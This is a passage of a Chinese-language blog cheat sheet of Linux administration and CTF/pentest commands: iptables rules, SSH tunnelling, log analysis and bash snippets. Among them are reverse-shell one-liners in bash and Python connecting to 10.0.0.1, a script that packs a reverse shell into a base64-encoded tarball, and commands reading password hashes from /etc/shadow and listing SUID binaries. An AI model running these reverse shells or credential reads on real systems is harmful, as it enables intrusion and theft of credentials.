   0x000000000040068e <span class="token operator">&lt;</span>+8<span class="token operator"><span class="token file-descriptor important">7</span>&gt;</span>:	xor    rcx,QWORD PTR fs:0x28
   0x0000000000400697 <span class="token operator">&lt;</span>+9<span class="token operator"><span class="token file-descriptor important">6</span>&gt;</span>:	je     0x40069e <span class="token operator">&lt;</span>main+10<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>
   0x0000000000400699 <span class="token operator">&lt;</span>+9<span class="token operator"><span class="token file-descriptor important">8</span>&gt;</span>:	call   0x4004f0 <span class="token operator">&lt;</span>__stack_chk_fail@plt<span class="token operator">&gt;</span>
   0x000000000040069e <span class="token operator">&lt;</span>+10<span class="token operator"><span class="token file-descriptor important">3</span>&gt;</span>:	leave
   0x000000000040069f <span class="token operator">&lt;</span>+10<span class="token operator"><span class="token file-descriptor important">4</span>&gt;</span>:	ret
End of assembler dump.
</code></pre> 
<h3><a id="Linux_447"></a>Linux文件——保护禁止修改、删除、移动文件等</h3> 
<p>自动化恢复监控目录下创建的新文件和新目录<br> https://github.com/ssooking/CTFDefense/blob/02290457382a43d6d4daadd8e4e7e023d1d5d572/Monitor/SimpleMonitor.py<br> 用法</p> 
<pre><code class="prism language-bash">pip <span class="token function">install</span> pynotify
python <span class="token parameter variable">-m</span> pynotify /tmp
</code></pre> 
<h3><a id="Linuxsocket_455"></a>Linux中查看指定进程socket连接数</h3> 
<pre><code class="prism language-bash"><span class="token function">ls</span> /proc/<span class="token operator">&lt;</span>进程pid<span class="token operator">&gt;</span>/fd <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> socket: <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span>
</code></pre> 
<h4><a id="demo_459"></a>demo</h4> 
<pre><code class="prism language-bash">cqq@kali:/tmp$ pidof sshd
<span class="token number">51070</span> <span class="token number">51068</span> <span class="token number">21038</span>
cqq@kali:/tmp$ <span class="token function">sudo</span> <span class="token function">ls</span> /proc/51068/fd <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> socket: <span class="token operator">|</span> <span class="token function">wc</span> <span class="token parameter variable">-l</span>
<span class="token punctuation">[</span>sudo<span class="token punctuation">]</span> password <span class="token keyword">for</span> cqq:
<span class="token number">3</span>
cqq@kali:/tmp$ <span class="token function">sudo</span> <span class="token function">ls</span> /proc/51068/fd <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> socket:
lrwx------ <span class="token number">1</span> root root <span class="token number">64</span> Oct <span class="token number">10</span> <span class="token number">17</span>:45 <span class="token number">3</span> -<span class="token operator">&gt;</span> socket:<span class="token punctuation">[</span><span class="token number">109283</span><span class="token punctuation">]</span>
lrwx------ <span class="token number">1</span> root root <span class="token number">64</span> Oct <span class="token number">10</span> <span class="token number">17</span>:45 <span class="token number">4</span> -<span class="token operator">&gt;</span> socket:<span class="token punctuation">[</span><span class="token number">109319</span><span class="token punctuation">]</span>
lrwx------ <span class="token number">1</span> root root <span class="token number">64</span> Oct <span class="token number">10</span> <span class="token number">17</span>:45 <span class="token number">6</span> -<span class="token operator">&gt;</span> socket:<span class="token punctuation">[</span><span class="token number">109349</span><span class="token punctuation">]</span>
</code></pre> 
<h3><a id="202202431252022024355_471"></a>禁止从客户机202.202.43.125访问202.202.43.55上的任何服务</h3> 
<pre><code class="prism language-bash">iptables <span class="token parameter variable">-t</span> filter <span class="token parameter variable">-A</span> FORWARD <span class="token parameter variable">-s</span> <span class="token number">202.202</span>.43.125 <span class="token parameter variable">-d</span> <span class="token number">202.202</span>.43.55 <span class="token parameter variable">-j</span> DROP
</code></pre> 
<h3><a id="TCP_475"></a>丢弃陌生的TCP响应包,防止反弹式攻击</h3> 
<pre><code class="prism language-bash">iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-m</span> state <span class="token parameter variable">--state</span> NEW <span class="token parameter variable">-p</span> tcp <span class="token operator">!</span> <span class="token parameter variable">--syn</span> <span class="token parameter variable">-j</span> DROP
iptables <span class="token parameter variable">-A</span> FORWARD <span class="token parameter variable">-m</span> state <span class="token parameter variable">--state</span> NEW <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--syn</span> <span class="token parameter variable">-j</span> DROP
</code></pre> 
<h3><a id="IPSSH_480"></a>限制/允许某IP/网段SSH登录本机</h3> 
<pre><code class="prism language-bash">iptable <span class="token parameter variable">-t</span> filter <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-s</span> <span class="token number">202.202</span>.43.125 <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> DROP 　　//禁止从202.202.43.125远程登陆到本机
iptables <span class="token parameter variable">-A</span> INPUT <span class="token parameter variable">-s</span> <span class="token number">202.202</span>.43.125/24 <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">22</span> <span class="token parameter variable">-j</span> ACCEPT　　//允许202.202.43.125网段远程登陆访问ssh
</code></pre> 
<h3><a id="IP_485"></a>限制单个IP最大连接数</h3> 
<pre><code class="prism language-bash"><span class="token comment">#限制单个IP的最大连接数为 30</span>
iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-p</span> tcp <span class="token parameter variable">--dport</span> <span class="token number">80</span> <span class="token parameter variable">-m</span> connlimit --connlimit-above <span class="token number">30</span> <span class="token parameter variable">-j</span> REJECT
</code></pre> 
<h3><a id="IPIP_490"></a>封某个IP或IP段</h3> 
<pre><code class="prism language-bash">iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-s</span> <span class="token builtin class-name">.</span> <span class="token parameter variable">-j</span> DROP
iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-s</span> ./ <span class="token parameter variable">-j</span> DROP
</code></pre> 
<h3><a id="MySQL_495"></a>备份/还原MySQL数据库</h3> 
<pre><code class="prism language-bash"><span class="token comment">## 备份mysql数据库</span>
mysqldump <span class="token parameter variable">-u</span> 用户名 <span class="token parameter variable">-p</span> 密码 数据库名 <span class="token operator">&gt;</span> back.sql　　　　
mysqldump --all-databases <span class="token operator">&gt;</span> bak.sql　　　　　　
<span class="token comment">## 还原mysql数据库</span>
mysql <span class="token parameter variable">-u</span> 用户名 <span class="token parameter variable">-p</span> 密码 数据库名 <span class="token operator">&lt;</span> bak.sql　　
</code></pre> 
<h3><a id="SUID_504"></a>找到正在系统上运行的所有SUID可执行文件</h3> 
<pre><code class="prism language-bash"><span class="token comment"># 从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null</span>
<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-print</span> <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> / <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token parameter variable">-type</span> f <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span>/dev/null
<span class="token function">find</span> / <span class="token parameter variable">-user</span> root <span class="token parameter variable">-perm</span> <span class="token parameter variable">-4000</span> <span class="token parameter variable">-exec</span> <span class="token function">ls</span> <span class="token parameter variable">-ldb</span> <span class="token punctuation">{<!-- --></span><span class="token punctuation">}</span> <span class="token punctuation">\</span><span class="token punctuation">;</span>
</code></pre> 
<h4><a id="demo_511"></a>demo</h4> 
<pre><code>cqq@ubuntu:~$ find / -user root -perm -4000 -print 2&gt;/dev/null
/bin/umount
/bin/ping
/bin/su
/bin/fusermount
/bin/ntfs-3g
/bin/ping6
/bin/mount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device

cqq@ubuntu:~$ find / -perm -u=s -type f 2&gt;/dev/null
/bin/umount
/bin/ping
/bin/su
/bin/fusermount
/bin/ntfs-3g
/bin/ping6
/bin/mount
/usr/bin/vmware-user-suid-wrapper
/usr/bin/passwd
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/newgrp
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device


cqq@ubuntu:~$ find / -user root -perm -4000 -exec ls -ldb {} \; 2&gt;/dev/null
-rwsr-xr-x 1 root root 27608 Jun 14 14:51 /bin/umount
-rwsr-xr-x 1 root root 44168 May  7  2014 /bin/ping
-rwsr-xr-x 1 root root 40128 May 16 16:37 /bin/su
-rwsr-xr-x 1 root root 30800 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 142032 Jan 28  2017 /bin/ntfs-3g
-rwsr-xr-x 1 root root 44680 May  7  2014 /bin/ping6
-rwsr-xr-x 1 root root 40152 Jun 14 14:51 /bin/mount
-rwsr-xr-x 1 root root 10624 Feb  9  2017 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 54256 May 16 16:37 /usr/bin/passwd
-rwsr-xr-x 1 root root 75304 May 16 16:37 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 49584 May 16 16:37 /usr/bin/chfn
-rwsr-xr-x 1 root root 136808 Jul  4 00:37 /usr/bin/sudo
-rwsr-xr-x 1 root root 39904 May 16 16:37 /usr/bin/newgrp
-rwsr-xr-x 1 root root 40432 May 16 16:37 /usr/bin/chsh
-rwsr-xr-- 1 root messagebus 42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 428240 Mar 16  2017 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root root 10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
</code></pre> 
<h3><a id="vim_572"></a>vim全局替换命令</h3> 
<pre><code> :%s/xxxx/yyyyy/g
</code></pre> 
<h3><a id="shell_576"></a>花式反弹shell</h3> 
<pre><code>bash -i &gt;&amp; /dev/tcp/10.0.0.1/8080 0&gt;&amp;1
######################################
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
</code></pre> 
<h3><a id="SSH_582"></a>使用SSH隧道</h3> 
<pre><code>ssh -qTfnN -L port:host:hostport -l user remote_ip      #正向隧道，监听本地port
ssh -qTfnN -R port:host:hostport -l user remote_ip      #反向隧道，用于内网穿透防火墙限制之类
ssh -qTfnN -D port remotehost                           #直接进行socks代理
#
#         -q    安静模式
#         -T    不占用shell
#         -f    后台执行(推荐加-n参数)
#         -N    不执行远程命令
</code></pre> 
<h3><a id="_593"></a>递归改变某目录及其下面所有文件的属主和属组</h3> 
<pre><code># sudo chown -R cqq:cqq html
</code></pre> 
<h3><a id="_597"></a>递归改变某目录的所有者为当前用户</h3> 
<pre><code># sudo chown -R $(whoami)  /usr/local/share
</code></pre> 
<h3><a id="SSH_601"></a>SSH端口转发</h3> 
<pre><code>ssh -CfNg -L port1:127.0.0.1:port2 user@host 本地转发
ssh -CfNg -R port2:127.0.0.1:port1 user@hsst 远程转发
</code></pre> 
<h3><a id="Linux_606"></a>Linux中以另一个用户身份运行命令</h3> 
<pre><code># Linux中以另一个用户身份运行命令
$ sudo -u www-data touch /var/www/html/test_www-data
# -u表示以某个user的身份，这里以www-data的身份创建了/var/www/html/test_www-data这个文件
</code></pre> 
<h3><a id="etcpasswd_613"></a>从/etc/passwd中找出所有用户</h3> 
<pre><code>$ cat /etc/passwd |cut -d ':' -f 1
root
daemon
bin
sys
sync
games
man
lp
mail
news
uucp
proxy
www-data
backup
list
irc
gnats
nobody
systemd-timesync
systemd-network
systemd-resolve
systemd-bus-proxy
syslog
_apt
messagebus
uuidd
cqq
sshd
redis
tomcat
mongodb
postgres
mysql
</code></pre> 
<h3><a id="etcshadowhash_650"></a>从/etc/shadow中找出用户的密码hash</h3> 
<pre><code>$ cat /etc/shadow |cut -d ':' -f 2 |egrep '^\$.\$'
</code></pre> 
<p><img src="https://images2.imgbox.com/0e/b6/gIOI0pnw_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="wireshark_655"></a>wireshark过滤用不着的协议包</h3> 
<pre><code>not arp and not ssdp and not icmp and not nbns and not dhcpfo and not llmnr and not mdns and not icmpv6 and not igmp and not dhcpv6
</code></pre> 
<h3><a id="ubuntusudo_660"></a>ubuntu添加用户,并将其加入到sudo用户组</h3> 
<pre><code># 添加用户,并将其加入到sudo用户组
$ useradd -m cqq -G sudo -s /bin/bash
# 已有用户的情况下，将其加入sudo组
$ usermod -a -G sudo cqq
</code></pre> 
<h4><a id="_668"></a>已其他用户运行命令</h4> 
<pre><code>runuser -l  userNameHere -c 'command'
</code></pre> 
<p>https://www.cyberciti.biz/open-source/command-line-hacks/linux-run-command-as-different-user/</p> 
<h3><a id="centos_674"></a>centos</h3> 
<p>可以看到只有只读权限</p> 
<pre><code>ls -l /etc/sudoers
</code></pre> 
<p>添加w权限</p> 
<pre><code>chmod u+w /etc/sudoers
</code></pre> 
<p>编辑sudoers文件，添加用户</p> 
<pre><code>vim /etc/sudoers
</code></pre> 
<p>找到这一行，照着root的格式添加要加入sudoers的用户</p> 
<pre><code>Allow root to run any commands anywhere
root    ALL=(ALL)       ALL
</code></pre> 
<p>wq保存退出<br> 这时候要记得将写权限收回</p> 
<pre><code>chmod u-w /etc/sudoers
</code></pre> 
<p>原文链接：https://blog.csdn.net/RBPicsdn/article/details/81054885</p> 
<h3><a id="bashshell_699"></a>在已有bash脚本中添加反弹shell的脚本</h3> 
<pre><code class="prism language-bash">f <span class="token operator">=</span> open<span class="token punctuation">(</span><span class="token string">'run.sh'</span>, <span class="token string">'w'</span><span class="token punctuation">)</span>
f.write<span class="token punctuation">(</span><span class="token string">'#!/bin/bash\n'</span><span class="token punctuation">)</span>
f.write<span class="token punctuation">(</span><span class="token string">'/bin/bash -i &gt;&amp; /dev/tcp/'</span> + args.lhost + <span class="token string">'/'</span> + args.lport + <span class="token string">' 0&gt;&amp;1\n'</span><span class="token punctuation">)</span>
f.close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 最后添加执行权限</span>
os.chmod<span class="token punctuation">(</span><span class="token string">'run.sh'</span>, 0777<span class="token punctuation">)</span>

<span class="token comment"># 添加打包文件的功能</span>
<span class="token function">import</span> tarfile

<span class="token comment"># 打开某gz文件，加入run.sh，然后关闭</span>
<span class="token function">tar</span> <span class="token operator">=</span> tarfile.open<span class="token punctuation">(</span><span class="token string">"root.tar.gz"</span>, <span class="token string">"w:gz"</span><span class="token punctuation">)</span>
tar.add<span class="token punctuation">(</span><span class="token string">"run.sh"</span><span class="token punctuation">)</span>
tar.close<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># 读这个tar文件，并对读到的内容进行base64加密</span>
with open<span class="token punctuation">(</span><span class="token string">"root.tar.gz"</span>, <span class="token string">"rb"</span><span class="token punctuation">)</span> as tarfile:
tar64 <span class="token operator">=</span> base64.b64encode<span class="token punctuation">(</span>tarfile.read<span class="token punctuation">(</span><span class="token punctuation">))</span>
</code></pre> 
<h3><a id="_722"></a>运维用的脚本</h3> 
<p>来自：https://xianzhi.aliyun.com/forum/read/2150.html</p> 
<h4><a id="ContentLength5M_724"></a>过滤Content-Length大于5M的日志</h4> 
<pre><code>awk '{if($10&gt;5000000){print $0}}' /var/log/httpd/access_log
</code></pre> 
<h4><a id="POST_728"></a>重点关注POST请求</h4> 
<pre><code>grep 'POST' /var/log/httpd/access_log | awk '{print $1}' | sort | uniq -c | sort -nr
</code></pre> 
<h4><a id="ssh_732"></a>查看ssh登录成功/失败的信息</h4> 
<pre><code>grep 'Accepted' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
</code></pre> 
<p>​或者last命令，它会读取位于<code>/var/log/wtmp</code>的文件，并把该文件记录的登录系统的用户名单，全部显示出来。</p> 
<pre><code>grep 'Failed' /var/log/secure | awk '{print $11}' | sort | uniq -c | sort -nr
</code></pre> 
<p>​或者lastb命令，会读取位于<code>/var/log/btmp</code>的文件，并把该文件记录的登入系统失败的用户名单，全部显示出来。</p> 
<h3><a id="_741"></a>捕获终端信号</h3> 
<pre><code class="prism language-bash"><span class="token keyword">function</span> <span class="token function-name function">control_c</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{<!-- --></span>
    <span class="token function">service</span> xxx stop
    <span class="token builtin class-name">echo</span> <span class="token parameter variable">-en</span> <span class="token string">"xxx has been stopped!"</span>
    <span class="token builtin class-name">exit</span> <span class="token variable">$?</span>
<span class="token punctuation">}</span>

<span class="token comment"># capture SIGINT(Ctrl + C) and exit the script clean</span>
<span class="token builtin class-name">trap</span> control_c SIGINT
</code></pre> 
<h3><a id="root_752"></a>判断当前用户是否是root</h3> 
<pre><code class="prism language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"0"</span> <span class="token operator">!=</span> <span class="token string">"<span class="token environment constant">$UID</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
	<span class="token builtin class-name">echo</span> <span class="token string">"需要 root 权限"</span>
	<span class="token builtin class-name">exit</span> <span class="token number">1</span>
<span class="token keyword">fi</span>
</code></pre> 
<h3><a id="_759"></a>判断是否存在某目录</h3> 
<pre><code class="prism language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token operator">!</span> <span class="token parameter variable">-d</span> <span class="token variable">$CONFIG_PATH</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
	<span class="token builtin class-name">echo</span> <span class="token string">"首次使用，调用ok-config命令进行配置，若配置错误将无法登录"</span>
	ok-config
<span class="token keyword">fi</span>
</code></pre> 
<h3><a id="0_766"></a>判断字符串的长度是否为0</h3> 
<h4><a id="0true_767"></a>为0，则为true</h4> 
<pre><code class="prism language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-z</span> <span class="token variable">$config_file</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>
    <span class="token assign-left variable">config_file</span><span class="token operator">=</span><span class="token string">"default"</span>
<span class="token keyword">fi</span>
</code></pre> 
<h4><a id="0true_773"></a>不为0，则为true</h4> 
<pre><code class="prism language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token parameter variable">-n</span> <span class="token string">"<span class="token variable">$ppp_ip</span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
	<span class="token builtin class-name">echo</span> <span class="token string">"登录成功!"</span>
</code></pre> 
<h3><a id="_778"></a>判断字符串的后缀</h3> 
<pre><code class="prism language-bash"><span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"cqupt"</span> <span class="token operator">==</span> <span class="token string">"<span class="token variable"><span class="token variable">$(</span><span class="token builtin class-name">echo</span> $OK_USER <span class="token operator">|</span> <span class="token function">awk</span> <span class="token parameter variable">-F</span> <span class="token string">'@'</span> <span class="token string">'{print $2}'</span><span class="token variable">)</span></span>"</span> <span class="token punctuation">]</span> <span class="token punctuation">;</span> <span class="token keyword">then</span>
</code></pre> 
<h3><a id="eth0_782"></a>得到eth0网卡的默认网关</h3> 
<pre><code class="prism language-bash"><span class="token assign-left variable">gateway_ip</span><span class="token operator">=</span><span class="token variable"><span class="token variable">`</span><span class="token function">ip</span> r <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'/default via/&amp;&amp;/dev '</span>eth0<span class="token string">'/{print $3}'</span><span class="token variable">`</span></span>
</code></pre> 
<h3><a id="ifconfigip_787"></a>输出ifconfig输出中的ip信息</h3> 
<pre><code class="prism language-bash">root@snort-ids:/home/cqq/repos<span class="token comment"># ip a show dev eth0 | awk '/inet [12]/'</span>
    inet <span class="token number">172.18</span>.124.136/22 brd <span class="token number">172.18</span>.127.255 scope global eth0
<span class="token comment"># 输出匹配行的第二列</span>
root@snort-ids:/home/cqq/repos<span class="token comment"># ip a show dev eth0 | awk '/inet [12]/{print $2}'</span>
<span class="token number">172.18</span>.124.136/22
</code></pre> 
<h3><a id="_795"></a>删除默认路由</h3> 
<pre><code class="prism language-bash"><span class="token function">ip</span> route del  <span class="token number">172.0</span>.0.0/8 <span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route del  <span class="token number">202.202</span>.0.0/16 <span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre> 
<h3><a id="_800"></a>添加内网路由</h3> 
<pre><code class="prism language-bash"><span class="token variable">$OK_ETH</span> <span class="token operator">=</span> <span class="token string">'eth0'</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">172.16</span>.0.0/12 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">172.32</span>.0.0/16 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">172.33</span>.0.0/16 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">172.34</span>.0.0/16 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">202.202</span>.32.0/20 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">202.202</span>.43.0/24 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">202.202</span>.45.0/24 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
<span class="token function">ip</span> route <span class="token function">add</span>  <span class="token number">222.177</span>.140.0/24 dev <span class="token variable">$OK_ETH</span> via <span class="token variable">$gateway_ip</span> metric <span class="token variable">$OK_METRIC</span> table <span class="token variable">$OK_RTTABLE</span><span class="token operator">&gt;</span> /dev/null <span class="token operator"><span class="token file-descriptor important">2</span>&gt;</span><span class="token file-descriptor important">&amp;1</span>
</code></pre> 
<pre><code class="prism language-bash"><span class="token assign-left variable">progname</span><span class="token operator">=</span><span class="token string">"<span class="token variable"><span class="token variable">$(</span> <span class="token function">basename</span> <span class="token string">"<span class="token variable">$0</span>"</span> <span class="token variable">)</span></span>"</span>

<span class="token punctuation">..</span>.
<span class="token comment">## Usage info</span>
<span class="token keyword">function</span> <span class="token function-name function">usage</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token builtin class-name">echo</span> <span class="token string">"  Usage: <span class="token variable">${progname}</span> [options] term1 [term2] ... [termN]"</span>
  <span class="token builtin class-name">echo</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"=========="</span>
  <span class="token builtin class-name">echo</span> <span class="token string">" Examples "</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"=========="</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"  <span class="token variable">${progname}</span> afd windows local"</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"  <span class="token variable">${progname}</span> -t oracle windows"</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"  <span class="token variable">${progname}</span> -p 39446"</span>
  <span class="token builtin class-name">echo</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"  For more examples, see the manual: https://www.exploit-db.com/searchsploit/"</span>
  <span class="token builtin class-name">echo</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"========="</span>
  <span class="token builtin class-name">echo</span> <span class="token string">" Options "</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"========="</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -c, --case     [Term]      Perform a case-sensitive search (Default is inSEnsITiVe)."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -e, --exact    [Term]      Perform an EXACT match on exploit title (Default is AND) [Implies <span class="token entity" title='\"'>\"</span>-t<span class="token entity" title='\"'>\"</span>]."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -h, --help                 Show this help screen."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -j, --json     [Term]      Show result in JSON format."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -m, --mirror   [EDB-ID]    Mirror (aka copies) an exploit to the current working directory."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -o, --overflow [Term]      Exploit titles are allowed to overflow their columns."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -p, --path     [EDB-ID]    Show the full path to an exploit (and also copies the path to the clipboard if possible)."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -t, --title    [Term]      Search JUST the exploit title (Default is title AND the file's path)."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -u, --update               Check for and install any exploitdb package updates (deb or git)."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -w, --www      [Term]      Show URLs to Exploit-DB.com rather than the local path."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   -x, --examine  [EDB-ID]    Examine (aka opens) the exploit using \<span class="token variable">$PAGER</span>."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"       --colour               Disable colour highlighting in search results."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"       --id                   Display the EDB-ID value rather than local path."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"       --nmap     [file.xml]  Checks all results in Nmap's XML output with service version (e.g.: nmap -sV -oX file.xml)."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"                              Use <span class="token entity" title='\"'>\"</span>-v<span class="token entity" title='\"'>\"</span> (verbose) to try even more combinations"</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"======="</span>
  <span class="token builtin class-name">echo</span> <span class="token string">" Notes "</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"======="</span>
  <span class="token builtin class-name">echo</span> <span class="token string">" * You can use any number of search terms."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">" * Search terms are not case-sensitive (by default), and ordering is irrelevant."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   * Use '-c' if you wish to reduce results by case-sensitive searching."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   * And/Or '-e' if you wish to filter results by using an exact match."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">" * Use '-t' to exclude the file's path to filter the search results."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">"   * Remove false positives (especially when searching using numbers - i.e. versions)."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">" * When updating from git or displaying help, search terms will be ignored."</span>
  <span class="token builtin class-name">echo</span> <span class="token string">""</span>
  <span class="token builtin class-name">exit</span> <span class="token number">2</span>
<span class="token punctuation">}</span>
</code></pre> 
<h3><a id="_864"></a>删除目录下文件名包含某特征的文件</h3> 
<p>比如我有很多index.html*的文件，</p> 
<pre><code class="prism language-bash">https://www.howtoing.com/delete-all-files-in-directory-except-one-few-file-extensions
</code></pre> 
<p><img src="https://images2.imgbox.com/db/a9/x1ENRwBK_o.png" alt="在这里插入图片描述"><br> 参考：<br> https://blog.csdn.net/qq_37858386/article/details/72654556<br> https://www.howtoing.com/delete-all-files-in-directory-except-one-few-file-extensions</p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/064f35c862074356bbed01c6a766aa7c/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
